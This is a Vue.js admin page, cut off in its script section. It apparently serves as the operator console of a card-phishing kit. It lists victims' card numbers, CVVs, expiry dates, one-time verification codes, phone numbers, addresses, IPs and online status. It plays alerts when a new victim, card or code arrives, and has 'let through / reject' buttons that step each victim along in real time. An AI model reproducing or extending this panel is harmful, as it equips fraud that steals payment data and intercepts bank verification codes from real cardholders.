<template>
  <div v-loading="listLoading" class="app-container">
    <el-card class="box-card">
      <div style="display: flex">
        <div style="padding: 10px">新用户提醒：<label class="start-voice" @click="voice=true" v-if="!voice">已停用</label>
          <label class="stop-voice" @click="voice=false" v-if="voice">已启用</label>
        </div>
        <div style="padding: 10px">卡号提醒：<label class="start-voice" @click="cardVoice=true" v-if="!cardVoice">已停用</label>
          <label class="stop-voice" @click="cardVoice=false" v-if="cardVoice">已启用</label>
        </div>
        <div style="padding: 10px">验证码提醒：<label class="start-voice" @click="codeVoice=true" v-if="!codeVoice"
        >已停用</label>
          <label class="stop-voice" @click="codeVoice=false" v-if="codeVoice">已启用</label>
        </div>
        <div>
          空卡过滤：
          <el-select v-model="p.cardFilter" placeholder="请选择" @change="fetchData">
            <el-option
              label="全部"
              :value="0"
            >
            </el-option>
            <el-option
              label="过滤"
              :value="1"
            >
            </el-option>
          </el-select>
        </div>
        <el-button type="danger" size="small" @click="deleteBatch" style="margin-left: 10px">批量删除</el-button>
      </div>
      <div style="padding: 10px">
        放行设置： <el-select v-model="passValue" size="small" placeholder="请选择" @change="setGlobalSetting">
        <el-option
          v-for="item in passList"
          :label="item.label"
          :value="item.value">
        </el-option>
      </el-select>
      </div>
      <el-button icon="el-icon-refresh" circle @click="fetchData"/>
      <el-checkbox v-model="showName" class="filter-item" style="margin-left:15px;">
        姓名
      </el-checkbox>
      <el-checkbox v-model="showCardHolder" class="filter-item" style="margin-left:15px;">
        持卡人
      </el-checkbox>
      <el-checkbox v-model="showPost" class="filter-item" style="margin-left:15px;">
        邮编
      </el-checkbox>
      <el-checkbox v-model="showIp" class="filter-item" style="margin-left:15px;">
        IP地址
      </el-checkbox>
      <el-checkbox v-model="showEmail" class="filter-item" style="margin-left:15px;">
        邮箱
      </el-checkbox>
      <el-checkbox v-model="showAddress" class="filter-item" style="margin-left:15px;">
        地址
      </el-checkbox>
      <el-checkbox v-model="showTime" class="filter-item" style="margin-left:15px;">
        时间
      </el-checkbox>
      <div style="display: flex;float: right;margin-right: 20px">
        <div style="margin-right: 10px">总览人数：{{statics.total}}</div>
        <div style="margin-right: 10px">在线人数：{{statics.online}}</div>
        <div>离线人数：{{statics.offline}}</div>
      </div>
    </el-card>
    <div style="height: 3px"/>
    <el-table
      ref="dataTable"
      :data="dataList"
      element-loading-text="Loading"
      border
      fit
      highlight-current-row
    >
      <el-table-column
        type="selection"
        width="55"
      >
      </el-table-column>
      <el-table-column align="center" label="ID" width="95">
        <template slot-scope="scope">
          {{ scope.row.id }}
        </template>
      </el-table-column>
      <el-table-column align="center" label="放行设置" width="150">
        <template v-slot="scope">
          <div>
            <el-select v-model="scope.row.passSetting" size="small" placeholder="请选择" @change="setItemSetting(scope.row)">
              <el-option
                v-for="item in passList"
                :label="item.label"
                :value="item.value">
              </el-option>
            </el-select>
          </div>
        </template>
      </el-table-column>
      <el-table-column align="center" label="当前放行" width="150">
        <template v-slot="scope">
          <div v-if="scope.row.currentStep >0&&scope.row.currentStep<=scope.row.stepTotal&&!scope.row.repetition">
            {{scope.row.text}}
            <div>
              <el-button type="info" size="mini" @click="page_await(scope.row.currentStep ,-1,scope.row)">驳回</el-button>
              <el-button type="success" size="mini" @click="page_await(scope.row.currentStep ,1,scope.row)">放行
              </el-button>
            </div>
          </div>
        </template>
      </el-table-column>
      <el-table-column v-if="showName" label="姓名">
        <template slot-scope="scope">
          {{ scope.row.familyName }}
        </template>
      </el-table-column>
      <el-table-column v-if="showName" label="名字">
        <template slot-scope="scope">
          <label v-if="scope.row.name"> {{ scope.row.name }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>
      <el-table-column label="状态" width="110">
        <template v-slot="scope">
          <el-tag v-if="scope.row.other" :type="isOnline(scope.row.other.endTime) | statusFilter">
            <label>
              {{ isOnline(scope.row.other.endTime) }}
            </label>
          </el-tag>
        </template>
      </el-table-column>
      <el-table-column label="持卡人" v-if="showCardHolder">
        <template slot-scope="scope">
          <label v-if="scope.row.cardHolder"> {{ scope.row.cardHolder }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>
      <el-table-column label="卡号" align="center" width="180">
        <template slot-scope="scope">
          <el-tag v-if="scope.row.card" type="success"
                  @click="Info = scope.row,cardimage(),cardHolder=scope.row.cardHolder,drawer = !drawer,cardNumber = scope.row.card,cardNameFirst = scope.row.familyName,cardName = scope.row.name,cardDate = scope.row.cardDate,cardCvv = scope.row.cvv"
          > {{ scope.row.card }}
          </el-tag>
          <label v-else>-</label>
        </template>
      </el-table-column>

      <el-table-column label="日期">
        <template slot-scope="scope">
          <label v-if="scope.row.cardDate"> {{ scope.row.cardDate }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>

      <el-table-column label="CVV">
        <template slot-scope="scope">
          <label v-if="scope.row.cvv"> {{ scope.row.cvv }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>

      <el-table-column label="验证码">
        <template slot-scope="scope">
          <label v-if="scope.row.validity"> {{ scope.row.validity }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>
      <el-table-column label="电话号码">
        <template slot-scope="scope">
          <label v-if="scope.row.phone"> {{ scope.row.phone }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>

      <el-table-column v-if="showEmail" label="邮箱">
        <template slot-scope="scope">
          <label v-if="scope.row.email"> {{ scope.row.email }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>

      <el-table-column label="邮编" v-if="showPost">
        <template slot-scope="scope">
          <label v-if="scope.row.post"> {{ scope.row.post }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>

      <el-table-column v-if="showAddress" label="州">
        <template slot-scope="scope">
          {{ scope.row.stateAddress }}
        </template>
      </el-table-column>
      <el-table-column v-if="showAddress" label="城市">
        <template slot-scope="scope">
          {{ scope.row.city }}
        </template>
      </el-table-column>

      <el-table-column v-if="showAddress" label="地区">
        <template slot-scope="scope">
          {{ scope.row.address }}
        </template>
      </el-table-column>
      <el-table-column v-if="showIp" label="IP地址">
        <template slot-scope="scope">
          <label v-if="scope.row.other">
            {{ scope.row.other.ip }}
          </label>
        </template>
      </el-table-column>

      <el-table-column label="设备UA地址" width="110">
        <template v-slot="scope">
          <el-tag v-if="scope.row.other">
            {{ UAJiex(scope.row.other.ua) }}
          </el-tag>
        </template>
      </el-table-column>
      <el-table-column label="卡种类" width="150">
        <template v-slot="scope">
            <label>{{scope.row.cardType }}</label>
        </template>
      </el-table-column>
      <el-table-column label="储蓄/信用卡" width="100">
        <template v-slot="scope">
          <label>{{scope.row.debit }}</label>
        </template>
      </el-table-column>
      <el-table-column label="卡等级" width="100">
        <template v-slot="scope">
          <label>{{scope.row.cardLevel }}</label>
        </template>
      </el-table-column>
      <el-table-column label="卡备注" width="100">
        <template v-slot="scope">
          <label>{{scope.row.remark }}</label>
        </template>
      </el-table-column>
      <el-table-column align="center" prop="created_at" label="时间" width="200" v-if="showTime">
        <template slot-scope="scope">
          <i class="el-icon-time"/>
          <span v-if="scope.row.other">{{ ToDate(scope.row.other.startTime) }}</span>
        </template>
      </el-table-column>
      <el-table-column fixed="right" label="操作" width="100">
        <template slot-scope="scope">
          <el-button type="danger" size="mini" @click="deleteFn(scope.row)">删除</el-button>
        </template>
      </el-table-column>
    </el-table>
    <el-drawer
      size="50%"
      title=""
      :visible.sync="drawer"
      :direction="direction"
    >
      <!--      卡片-->
      <div data-v-103fcbaa="" data-v-2f8ae276="" :class="!cardIsTrue?'-active':''" class="card-item "
           @click="cardIsTrue = !cardIsTrue"
      >
        <div data-v-103fcbaa="" class="card-item__side -front">
          <div data-v-103fcbaa="" class="card-item__focus"/>
          <div data-v-103fcbaa="" aria-label="" class="card-item__cover">
            <img
              data-v-103fcbaa=""
              :src="cardImag1"
              alt="Background image"
              class="card-item__bg"
            ></div>
          <div data-v-103fcbaa="" class="card-item__wrapper">
            <div data-v-103fcbaa="" class="card-item__top">
              <img
                data-v-103fcbaa=""
                src="../../../icons/img/Chip.png"
                alt="Card chip image"
                class="card-item__chip"
              >
              <div data-v-103fcbaa="" class="card-item__type">
                <img
                  data-v-103fcbaa=""
                  src="data:image/png;base64,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"
                  alt="mastercard brand image"
                  class="card-item__typeImg"
                >
              </div>
            </div>
            <label data-v-103fcbaa="" aria-label="Card number" class="card-item__number">
              <span v-for=" (item_4,i) in cardNumber.split('')" :key="item_4.char" data-v-103fcbaa="">
                <div data-v-103fcbaa="" class="card-item__numberItem"> {{ item_4 }}</div>
                <span v-if="i===3||i===7||i===11" data-v-103fcbaa="">
                  <div data-v-103fcbaa="" class="card-item__numberItem -active"/>
                </span>
              </span>
            </label>
            <div data-v-103fcbaa="" class="card-item__content">
              <label
                data-v-103fcbaa=""
                aria-label="Card name"
                class="card-item__info"
              >
                <div data-v-103fcbaa="" class="card-item__holder"> Card Holder</div>
                <div data-v-103fcbaa="" class="card-item__name">
                  <span>{{cardHolder}}</span>
                </div>
              </label>

              <div data-v-103fcbaa="" class="card-item__date">
                <label data-v-103fcbaa="" aria-label="CVV" class="card-item__dateTitle">CVV</label>
                <label data-v-103fcbaa="" aria-label="CVV" class="card-item__dateItem">
                  <span data-v-103fcbaa="">{{ cardCvv }}</span>
                </label>
              </div>
              <div data-v-103fcbaa="" class="card-item__date">
                <label data-v-103fcbaa="" aria-label="Expiration date" class="card-item__dateTitle">Expires</label>
                <label data-v-103fcbaa="" aria-label="Card month" class="card-item__dateItem">
                  <span data-v-103fcbaa="">{{ cardDate.split('/')[0] }}</span>
                </label>
                /
                <label data-v-103fcbaa="" aria-label="Card year" class="card-item__dateItem">
                  <span data-v-103fcbaa="">{{ cardDate.split('/')[1] }}</span>
                </label>
              </div>
            </div>
          </div>
        </div>

        <div data-v-103fcbaa="" class="card-item__side -back">
          <div data-v-103fcbaa="" aria-label="" class="card-item__cover">
            <img
              data-v-103fcbaa=""
              :src="cardImag2"
              alt="Background image"
              class="card-item__bg"
            ></div>
          <div data-v-103fcbaa="" class="card-item__band"/>
          <div data-v-103fcbaa="" class="card-item__cvv">
            <label data-v-103fcbaa="" aria-label="Card CVV">
              <div data-v-103fcbaa="" class="card-item__cvvTitle">CVV</div>
              <div data-v-103fcbaa="" class="card-item__cvvBand">
                <span data-v-103fcbaa="">{{ cardCvv }}</span></div>
            </label>
            <div data-v-103fcbaa="" class="card-item__type">
              <img
                data-v-103fcbaa=""
                src="data:image/png;base64,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"
                alt="Dark bar image"
                class="card-item__typeImg"
              ></div>
          </div>
        </div>
      </div>
      <!--      卡片-->
      <div data-v-2f8ae276="" class="detail el-col el-col-10" style="text-align: left;margin-left: 3cm;">
        <h2 data-v-2f8ae276="">
          <i data-v-2f8ae276="" class="el-icon-wallet mr-2"/>付款信息
        </h2>
        <div data-v-2f8ae276="" style="width: 100%;"/>
        <p data-v-2f8ae276="">
          <label data-v-2f8ae276="">卡号: </label>
          <span data-v-2f8ae276="">{{ Info.card }}</span>
        </p>
        <p data-v-2f8ae276="">
          <label data-v-2f8ae276="">有效期: </label>
          <span data-v-2f8ae276="">{{ Info.cardDate }}</span>
        </p>
        <p data-v-2f8ae276="">
          <label data-v-2f8ae276="">安全码: </label>
          <span data-v-2f8ae276="">{{ Info.cvv }}</span>
        </p>
        <h2 data-v-2f8ae276="">
          <i data-v-2f8ae276="" class="el-icon-user mr-2"/>个人信息</h2>
        <div data-v-2f8ae276="" style="width: 100%;">
          <div data-v-2f8ae276="" class="el-divider el-divider--horizontal"/>
        </div>
        <p data-v-2f8ae276="">
          <label data-v-2f8ae276="">姓名: </label>
          <span data-v-2f8ae276="">{{Info.name}}</span>
        </p>
        <p data-v-2f8ae276="">
          <label data-v-2f8ae276="">手机号码: </label>
          <span data-v-2f8ae276="">{{ Info.phone }}</span>
        </p>
        <p data-v-2f8ae276="">
          <label data-v-2f8ae276="">地址1: </label>
          <span data-v-2f8ae276="">{{Info.address}}</span>
        </p>
        <p data-v-2f8ae276="">
          <label data-v-2f8ae276="">邮编: </label>
          <span data-v-2f8ae276="">{{ Info.post }}</span>
        </p>
      </div>
    </el-drawer>
    <el-pagination
      :current-page="p.pageNo"
      :page-sizes="[10,50, 100, 200,500]"
      :page-size="p.pageSize"
      layout="total, sizes, prev, pager, next, jumper"
      :total="p.dataCount"
      @size-change="handleSizeChange"
      @current-change="handleCurrentChange"
    />
    <div v-show="false">
      <audio   ref="cardFinish"   controls >
        <source :src="cardFinish"  type="audio/mpeg" autoplay>
      </audio>
      <audio :src="codeValidSrc" ref="codeValid"  type="audio/mp3" controls >
      </audio>
      <audio :src="cardValidSrc" ref="cardValid"  type="audio/mp3" controls >
      </audio>
      <audio :src="newSrc" ref="new">
      </audio>
      <audio :src="validSrc" ref="valid"  type="audio/mp3">
      </audio>
      <audio :src="updateSrc" ref="update"  type="audio/mp3">
      </audio>
    </div>
    <el-dialog
      title="警告"
      :visible.sync="modal.visible"
      width="300px"
    >
      <span>{{modal.content}}</span>
      <span slot="footer" class="dialog-footer">
    <el-button @click="modal.visible = false">取 消</el-button>
    <el-button type="primary" @click="sureDeleteFn">确 定</el-button>
  </span>
    </el-dialog>
  </div>
</template>

<script>
  import { getSyncList, postSyncAgree, deleteData, getToken,updateSetting,setSetting,getSetting } from '@/api/card'
  import { statics } from '@/api/visitor'
  import item from '../../../layout/components/Sidebar/Item.vue'

  export default {
    filters: {
      statusFilter(status) {
        if (status === '在线') {
          return 'success'
        }
        if (status === '离线') {
          return 'info'
        }
        const statusMap = {
          1: 'success',
          0: 'gray',
          2: 'danger'
        }
